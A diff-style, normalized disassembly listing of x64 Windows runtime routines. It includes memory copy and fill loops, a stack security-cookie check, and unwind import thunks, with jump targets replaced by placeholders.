+mov r9 [ rdx + rcx + 0x10 ]
+mov r10 [ rdx + rcx + 0x18 ]
+movnti [ rcx + 0x10 ] r9
+movnti [ rcx + 0x18 ] r10
+mov r9 [ rdx + rcx + 0x20 ]
+mov r10 [ rdx + rcx + 0x28 ]
+add rcx 0x40
+movnti [ rcx - 0x20 ] r9
+movnti [ rcx - 0x18 ] r10
+mov r9 [ rdx + rcx - 0x10 ]
+mov r10 [ rdx + rcx - 0x8 ]
+dec eax
+movnti [ rcx - 0x10 ] r9
+movnti [ rcx - 0x8 ] r10
+jne r-xdata
+sub r8 0x1000
+cmp r8 0x1000
+jae r-xdata
+[ rsp ] 0x0
+jmp r-xdata
+[ rsp ] 0x0
+jmp r-xdata
+sub_1800023e4
+push rbx
+sub rsp 0x20
+mov r11d [ r8 ]
+mov rbx rdx
+mov r9 rcx
+and r11d 0xfffffff8
+test [ r8 ] 0x4
+mov r10 rcx
+je r-xdata
+movsxd rax r11d
+mov rdx [ rax + r10 ]
+mov rax [ rbx + 0x10 ]
+mov ecx [ rax + 0x8 ]
+add rcx [ rbx + 0x8 ]
+test [ rcx + 0x3 ] 0xf
+je r-xdata
+mov eax [ r8 + 0x8 ]
+movsxd r10 [ r8 + 0x4 ]
+neg eax
+add r10 rcx
+movsxd rcx eax
+and r10 rcx
+xor r9 rdx
+mov rcx r9
+add rsp 0x20
+pop rbx
+jmp sub_180001d40
+movzx eax [ rcx + 0x3 ]
+and eax 0xfffffff0
+cdqe
+add r9 rax
+sub_180002480
+mov rax rcx
+cmp r8 0x8
+jb r-xdata
+test r8 r8
+je r-xdata
+movzx edx dl
+mov r9 0x101010101010101
+imul rdx r9
+cmp r8 0x40
+jb r-xdata
+retn
+mov [ rcx ] dl
+inc rcx
+dec r8
+jne r-xdata
+mov r9 r8
+and r8 0x7
+shr r9 0x3
+je r-xdata
+neg rcx
+and ecx 0x7
+je r-xdata
+nop
+nop
+add rcx rax
+mov r9 r8
+and r8 0x3f
+shr r9 0x6
+jne r-xdata
+sub r8 rcx
+mov [ rax ] rdx
+mov [ rcx ] rdx
+add rcx 0x8
+dec r9
+jne r-xdata
+cmp r9 0x1c00
+jae r-xdata
+movnti [ rcx ] rdx
+movnti [ rcx + 0x8 ] rdx
+movnti [ rcx + 0x10 ] rdx
+add rcx 0x40
+movnti [ rcx - 0x28 ] rdx
+movnti [ rcx - 0x20 ] rdx
+dec r9
+movnti [ rcx - 0x18 ] rdx
+movnti [ rcx - 0x10 ] rdx
+movnti [ rcx - 0x8 ] rdx
+jne r-xdata
+mov [ rcx ] rdx
+mov [ rcx + 0x8 ] rdx
+mov [ rcx + 0x10 ] rdx
+add rcx 0x40
+mov [ rcx - 0x28 ] rdx
+mov [ rcx - 0x20 ] rdx
+dec r9
+mov [ rcx - 0x18 ] rdx
+mov [ rcx - 0x10 ] rdx
+mov [ rcx - 0x8 ] rdx
+jne r-xdata
+[ rsp ] 0x0
+jmp r-xdata
+jmp r-xdata
+sub_180001610
+xor al al
+test r8 r8
+je r-xdata
+retn
+nop [ rax + rax ] ax
+add al [ rcx ]
+mov [ rcx ] 0x0
+inc rcx
+sub r8 0x1
+jne r-xdata
+sub_180001d40
+cmp rcx [ rw-data ]
+jne r-xdata
+jmp sub_180001f34
+rol rcx 0x10
+test cx 0xffff
+jne r-xdata
+ror rcx 0x10
+retn
+sub_180002080
+and [ rw-data ] 0x0
+retn
+RtlVirtualUnwind
+jmp [ RtlVirtualUnwind@IAT ]
+RtlLookupFunctionEntry
+jmp [ RtlLookupFunctionEntry@IAT ]
+sub_180002448
+sub rsp 0x28
+mov r8 [ r9 + 0x38 ]
+mov rcx rdx
+mov rdx r9
+call sub_1800023e4
+mov eax 0x1
+add rsp 0x28
+retn
